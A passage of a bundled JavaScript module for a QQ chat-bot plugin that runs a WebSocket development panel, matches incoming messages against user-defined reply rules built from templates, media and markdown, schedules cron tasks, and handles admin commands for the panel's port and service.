            try {
                this.clients.get(clientId).send(JSON.stringify({ type, params, action }));
            }
            catch (error) {
                console.error(`Error sending message to client ${clientId}`, error);
                this.clients.delete(clientId);
            }
            return;
        }
        for (const [key, ws] of this.clients.entries()) {
            try {
                ws.send(JSON.stringify({ params, action, type }));
            }
            catch (error) {
                console.error(`Error sending message to client ${key}`, error);
                this.clients.delete(key);
            }
        }
    }
}

const bot$2 = await Bot();
function makeStdin(text, mt) {
    mt.sendMsg({
        sender: {
            user_id: 114514,
            nickname: '系统提示'
        },
        message: [{
                type: 'text',
                text: text
            }]
    }, 'e_info');
}
async function handleReplyMsg(data, mt) {
    if (data.type == 'message' && data.action == 'send_message') {
        const { params } = data;
        if (params.type == 'group') {
            await bot$2.sendGroupMsg(params.id, params.msg);
            makeStdin(`发送群聊${params.id}成功！`, mt);
        }
        else if (params.type == 'private') {
            await bot$2.sendPrivateMsg(params.id, params.msg);
            makeStdin(`发送私聊${params.id}成功！`, mt);
        }
        else if (params.type == 'guild') {
            await bot$2.sendGuildMsg(params.guild_id, params.id, params.msg);
            makeStdin(`发送频道${params.id}成功！`, mt);
        }
    }
}

const logger$2 = await Logger();
const bot$1 = await Bot();
let wss;
let microWs = new MicroWs();
microWs.use(handleReplyMsg);
const startServer = async (port) => {
    wss = new WebSocketServer({ server });
    wss.on('connection', microWs.onOpen.bind(microWs));
    await new Promise((resolve, reject) => {
        server.listen(port, async (err) => {
            if (err) {
                reject(err);
            }
            else {
                const { local, remote } = await getAllWebAddress();
                logger$2.info(chalk.blue('----------Micro---------'));
                logger$2.info(chalk.blue(`微代码开发服务器启动成功！您可在以下地址进行开发管理：`));
                logger$2.info(chalk.blue(`公网地址：${remote[0]}`));
                logger$2.info(chalk.blue(`内网地址：${local[0]}`));
                logger$2.info(chalk.blue('------------------------'));
                if (!Cfg$1.masterQQ || Cfg$1.masterQQ.length == 0) {
                    logger$2.mark('[Micro]未找到主人QQ，请确定是否已配置');
                }
                try {
                    await bot$1.sendPrivateMsg(Number(Cfg$1.masterQQ[0]), `微代码开发服务器启动成功，您可打开浏览器进入以下地址开发管理：\n` +
                        `公网地址：${remote[0]}\n` +
                        `内网地址：${local[0]}`);
                }
                catch (err) {
                    logger$2.mark('[Micro]Bot实例不存在或未配置主人QQ，部分功能可能失效' + err);
                }
                resolve('ok');
            }
        });
    });
};
const stopServer = () => {
    return new Promise((resolve, reject) => {
        if (wss) {
            wss.close((err) => {
                if (err) {
                    reject(err);
                }
                if (server) {
                    server.close((err) => {
                        if (err) {
                            reject(err);
                        }
                        resolve('ok');
                    });
                }
                else {
                    resolve('ok');
                }
            });
        }
        else {
            resolve('ok');
        }
    });
};
const restartServer = async (port) => {
    await stopServer();
    await startServer(port);
};

let plugin$2 = await Plugin();
let segment = await Segment();
let puppeteer = await Puppeteer();
let bot = await Bot();
let redis = await Redis();
let logger$1 = await Logger();
class RunPlugin extends plugin$2 {
    pluginsPath;
    indexPath;
    cronTask;
    pluginReadMode;
    constructor() {
        super({
            name: "消息处理",
            event: "message"
        });
        this.priority = 4000;
        this.rule = [
            {
                reg: /(.*)/,
                fnc: "run",
            },
            {
                reg: /小微切换读取模式/,
                fnc: "checkoutReadMode",
            },
            {
                reg: /小微指令列表(.*)/,
                fnc: "viewPluginsList",
            },
            {
                reg: /小微删除指令(.*)/,
                fnc: "deletePlugin",
            },
        ];
        this.pluginsPath = join(botInfo.WORK_PATH, 'data', 'micro-plugin', 'plugins');
        this.indexPath = join(botInfo.WORK_PATH, 'data', 'micro-plugin', 'regs.json');
        this.pluginReadMode = 'redis';
        this.init();
    }
    async init() {
        if (!existsSync(this.pluginsPath)) {
            mkdirSync(this.pluginsPath, { recursive: true });
        }
        if (!existsSync(this.indexPath)) {
            let defaultRegsPath = join(pluginInfo.ROOT_PATH, 'src', 'apps', 'help', 'regs.json');
            let defaultRegs = JSON.parse(readFileSync$1(defaultRegsPath, 'utf8'));
            await redis.set(this.pluginsKey, JSON.stringify(defaultRegs));
            copyFileSync(defaultRegsPath, this.indexPath);
            copyDirectory(join(pluginInfo.ROOT_PATH, 'src', 'apps', 'help', 'micro-help'), join(this.pluginsPath, 'micro-help'));
        }
        let plugins = await this.pluginsList() || [];
        plugins.forEach((plugin) => {
            if (plugin.cron) {
                this.cronTask[plugin.id].job = schedule.scheduleJob(plugin.cron, async () => {
                    try {
                        logger$1.mark(`执行定时任务：${plugin.id}`);
                        await this.run({ taskId: plugin.id });
                    }
                    catch (error) {
                        logger$1.error(`定时任务报错：${plugin.id}`);
                        logger$1.error(error);
                    }
                });
            }
        });
    }
    get pluginsKey() {
        return `Micro:Plugins`;
    }
    async pluginsList() {
        if (this.pluginReadMode == 'redis') {
            return JSON.parse(await redis.get(this.pluginsKey));
        }
        if (this.pluginReadMode == 'json') {
            return JSON.parse(readFileSync$1(this.indexPath, 'utf8'));
        }
    }
    checkAuth(plugin) {
        if (plugin.reg == '' && plugin.cron == '')
            return false;
        if (plugin.isGlobal) {
            if (plugin.groups.includes(String(this.e.group_id)))
                return false;
            if (plugin.friends.includes(String(this.e.user_id)))
                return false;
        }
        else {
            if (!plugin.groups.includes(String(this.e.group_id)))
                return false;
            if (!plugin.friends.includes(String(this.e.user_id)))
                return false;
        }
        return true;
    }
    checkoutReadMode() {
        if (this.pluginReadMode == 'redis') {
            this.pluginReadMode = 'json';
        }
        else {
            this.pluginReadMode = 'redis';
        }
        this.e.reply('切换成功，当前读取模式：' + this.pluginReadMode);
    }
    async setPluginsList(value) {
        writeFileSync$1(this.indexPath, JSON.stringify(value, null, 2), 'utf-8');
        await redis.set(this.pluginsKey, JSON.stringify(value));
    }
    async run(e = { taskId: '' }) {
        if (!this.e.message && !e.taskId)
            return false;
        if (e.taskId) {
            this.e = {};
        }
        let msgQueue = [];
        let pluginsList = await this.pluginsList();
        for (let plugin of pluginsList) {
            if (!this.checkAuth)
                continue;
            const regexp = new RegExp(plugin.reg, plugin.flag);
            const pluginPath = join(this.pluginsPath, plugin.id);
            if (e.taskId == plugin.id || regexp.test(this.e.msg)) {
                const { message } = plugin;
                let msgSegList = [];
                for (let item of message) {
                    switch (item.type) {
                        case 'text':
                            try {
                                let compileText = new Function('e', 'Bot', 'return ' + '`' + item.data + '`');
                                msgSegList.push(compileText(this.e, Bot));
                            }
                            catch (err) {
                                logger$1.error(err);
                            }
                            break;
                        case 'image':
                            if (item.url) {
                                msgSegList.push(segment.image(item.url));
                            }
                            else {
                                const img = await puppeteer.screenshot('micro-plugin/plugins', {
                                    saveId: item.hash,
                                    tplFile: join(pluginPath, item.hash + '.html'),
                                    e: this.e,
                                    Bot: Bot
                                });
                                msgSegList.push(img);
                            }
                            break;
                        case 'record':
                            if (item.url) {
                                msgSegList.push(segment.record(item.url));
                            }
                            break;
                        case 'video':
                            if (item.url) {
                                msgSegList.push(segment.video(item.url));
                            }
                            break;
                        case 'face':
                            msgSegList.push(segment.face(Number(item.data)));
                            break;
                        case 'dice':
                            msgSegList.push(segment.poke(Number(item.data)));
                            break;
                        case 'poke':
                            msgSegList.push(segment.poke(Number(item.data)));
                            break;
                        case 'markdown':
                            const mdPath = join(pluginPath, 'markdown.json');
                            if (existsSync(mdPath)) {
                                let mdContent = JSON.parse(readFileSync$1(mdPath, 'utf8'));
                                if (mdContent.content == '') {
                                    delete mdContent.params;
                                    msgSegList.push({ type: 'markdown', content: mdContent });
                                }
                                else {
                                    delete mdContent.content;
                                    mdContent = mdContent.map((item) => {
                                        delete item.tempString;
                                        return item;
                                    });
                                    msgSegList.push({ type: 'markdown', content: mdContent });
                                }
                            }
                            break;
                        case 'button':
                            if (existsSync(join(pluginPath, 'button.json'))) {
                                let btnContent = JSON.parse(readFileSync$1(join(pluginPath, 'button.json'), 'utf8'));
                                msgSegList.push(segment.button(btnContent));
                            }
                            break;
                        default:
                            logger$1.warn('暂不支持该消息类型！');
                    }
                }
                msgQueue.push(Object.assign(plugin, { message: msgSegList }));
            }
        }
        if (msgQueue.length == 0)
            return false;
        for (let msg of msgQueue) {
            if (msg.delayTime) {
                if (typeof msg.delayTime != 'number') {
                    msg.delayTime = Number(msg.delayTime);
                }
                setTimeout(async () => {
                    if (this.e.reply) {
                        await this.e.reply(msg.message, msg.isQuote, { at: msg.isAt });
                    }
                    else {
                        if (e.taskId) {
                            if (msg.isGlobal === false) {
                                msg.groups.forEach(async (group_id) => {
                                    await bot.sendGroupMsg(group_id, msg.message);
                                });
                                msg.friends.forEach(async (user_id) => {
                                    await bot.sendPrivateMsg(user_id, msg.message);
                                });
                            }
                        }
                    }
                }, msg.delayTime);
            }
            else {
                if (this.e.reply) {
                    await this.e.reply(msg.message, msg.isQuote, { at: msg.isAt });
                }
                else {
                    if (e.taskId) {
                        if (msg.isGlobal === false) {
                            msg.groups.forEach(async (group_id) => {
                                await bot.sendGroupMsg(group_id, msg.message);
                            });
                            msg.friends.forEach(async (user_id) => {
                                await bot.sendPrivateMsg(user_id, msg.message);
                            });
                        }
                    }
                }
            }
        }
        return true;
    }
    async viewPluginsList() {
        if (!(/.*小微指令列表(\d+)/.test(this.e.msg))) {
            this.e.reply('请发送有效页码！');
        }
        const pageNo = Number((/.*小微指令列表(\d+)/.exec(this.e.msg))[1]) || 1;
        const pluginList = await this.pluginsList();
        const pagerInstance = new Pager(pluginList, pageNo, 10);
        if (pagerInstance.records.length == 0) {
            this.e.reply('超出页数啦！');
        }
        this.e.reply(JSON.stringify(pagerInstance.records, null, 2));
    }
    async deletePlugin() {
        if (!(/.*小微删除指令(\d+)/.test(this.e.msg))) {
            this.e.reply('请发送有效指令id！');
        }
        const pluginList = await this.pluginsList();
        const pluginId = Number((/.*小微删除指令(\d+)/.exec(this.e.msg))[1]) || 0;
        if (pluginId >= pluginList.length) {
            this.e.reply('不存在该序号，当前共' + pluginList.length + '条指令！');
            return;
        }
        const pluginPath = join(this.pluginsPath, pluginList[pluginId].id);
        if (existsSync(pluginPath)) {
            rmSync$1(pluginPath, { recursive: true, force: true });
        }
        pluginList.splice(pluginId - 1, 1);
        this.setPluginsList(pluginList);
        this.e.reply('删除成功！');
    }
}

let plugin$1 = await Plugin();
class Service extends plugin$1 {
    constructor() {
        super({
            name: "ws服务",
            event: "message"
        });
        this.priority = 4000;
        this.rule = [
            {
                reg: /(.*)/,
                fnc: "listen",
            },
        ];
    }
    async listen() {
        const { msg, message, group_name, group_id, sender } = this.e;
        if (!sender.user_id) {
            sender.user_id = this.e.user_id;
        }
        microWs.sendMsg({ msg, message, group_name, group_id, sender }, 'e_info');
        return true;
    }
}

let plugin = await Plugin();
class Settings extends plugin {
    constructor() {
        super({
            name: "设置",
            event: "message"
        });
        this.priority = 500;
        this.rule = [
            {
                reg: /小微设置面板端口(.*)/,
                fnc: "setWebPort"
            },
            {
                reg: /小微开启面板服务/,
                fnc: "startWeb"
            },
            {
                reg: /小微关闭面板服务/,
                fnc: "closeWeb"
            },
            {
                reg: /小微重启面板服务/,
                fnc: "reStartWeb"
            },
        ];
    }
    async setWebPort() {
        let port = 23306;
        if (/小微设置面板端口(\d+)/.test(this.e.msg)) {
            port = Number(this.e.msg.replace(/.*小微设置面板端口/, ''));
            if (port < 5000 || port > 65535) {
                this.e.reply('范围请选择【5000~65535】');
                return;
            }
        }
        else {
            this.e.reply('范围请选择【5000~65535】');
            return;
        }
        try {
            Cfg$1.setConfig(port, ['server', 'port'], 'server');
            this.e.reply('端口号设置成功，更新为' + port);
        }
        catch (err) {
            this.e.reply(JSON.stringify(err));
        }
    }
    async startWeb() {
        try {
            const port = Cfg$1.getConfig('server').server.port;
            await startServer(port);
            this.e.reply('小微插件面板服务启动成功！');
        }
        catch (err) {
            this.e.reply(JSON.stringify(err));
        }
    }
    async reStartWeb() {
        try {
            this.e.reply('开始重启面板请稍等...');
            const port = Cfg$1.getConfig('server').server.port;
            const startDate = Date.now();
            await restartServer(port);
            this.e.reply('小微插件面板服务重启成功！耗时' + (Date.now() - startDate) + 'ms');
        }
        catch (err) {
            this.e.reply(JSON.stringify(err));
        }
    }
    async closeWeb() {
        try {
            await stopServer();
            this.e.reply('小微插件面板服务关闭成功！');
        }
        catch (err) {
            this.e.reply(JSON.stringify(err));
        }
    }
}

const logger = await Logger();
const { PLUGIN_NAME, PLUGIN_AUTHOR, PLUGIN_DESC, PLUGIN_VERSION } = pluginInfo;
let Data = [];
var index = () => {
    return applicationOptions({
        async create() {
            await Cfg$1.mergeYamlFile();
            const Port = Cfg$1.getConfig('server').server.port;
            Data = [
                new RunPlugin(),
                new Service(),
                new Settings()
            ];
            logger.info(chalk.green('-------Welcome​~(∠・ω< )⌒☆​-------'));
            logger.info(`${PLUGIN_NAME} & v${PLUGIN_VERSION} 初始化...`);
            logger.info(`${PLUGIN_DESC}`);
            logger.info('bug积累中...呜呜出错删掉不要骂我(˵¯͒〰¯͒˵)');
            logger.info(`Created By ${PLUGIN_AUTHOR}`);
            logger.info(chalk.green('-----------------------------------'));
            await startServer(Port);
        },
        mounted() {
            return Data;
        }
    });
};

export { index as default };
